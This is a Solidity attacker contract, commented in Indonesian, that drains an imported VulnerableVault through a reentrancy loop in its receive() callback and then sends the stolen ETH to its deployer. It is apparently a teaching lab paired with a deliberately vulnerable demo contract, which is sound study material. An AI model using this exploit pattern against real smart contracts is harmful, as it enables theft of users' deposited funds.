// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./VulnerableVault.sol";

/**
 * @title Attacker
 * @notice Contract yang EXPLOIT reentrancy di VulnerableVault
 *
 * Cara kerja exploit:
 * 1. Attacker deposit 5 ETH ke vault (vault total: 15 ETH)
 * 2. Attacker panggil withdraw()
 * 3. Vault kirim 5 ETH ke Attacker
 * 4. receive() Attacker dipanggil -> panggil withdraw() lagi
 * 5. Ulangi sampai vault kosong
 * 6. Attacker kirim semua ETH ke owner
 */
contract Attacker {
    VulnerableVault public vault;
    address public owner;
    uint256 public attackCount;

    constructor(address payable _vaultAddress) {
        vault = VulnerableVault(_vaultAddress);
        owner = msg.sender;
    }

    // Step 1: Deposit ETH buat mulai attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");

        // Deposit ke vault
        vault.deposit{value: msg.value}();

        // Mulai reentrancy!
        attackCount = 0;
        vault.withdraw();
    }

    // INI YANG PENTING: receive() callback
    // Setiap kali vault kirim ETH, fungsi ini dipanggil
    // Fungsi ini panggil withdraw() lagi -> REENTRANCY!
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            attackCount++;
            vault.withdraw();  // RE-ENTER!
        }
        // Kalau vault udah kosong, loop berhenti
    }

    // Kirim semua profit ke owner (deployer)
    function collectProfit() external {
        require(msg.sender == owner, "Not owner");
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    // Cek berapa kali re-enter
    function getAttackCount() external view returns (uint256) {
        return attackCount;
    }
}
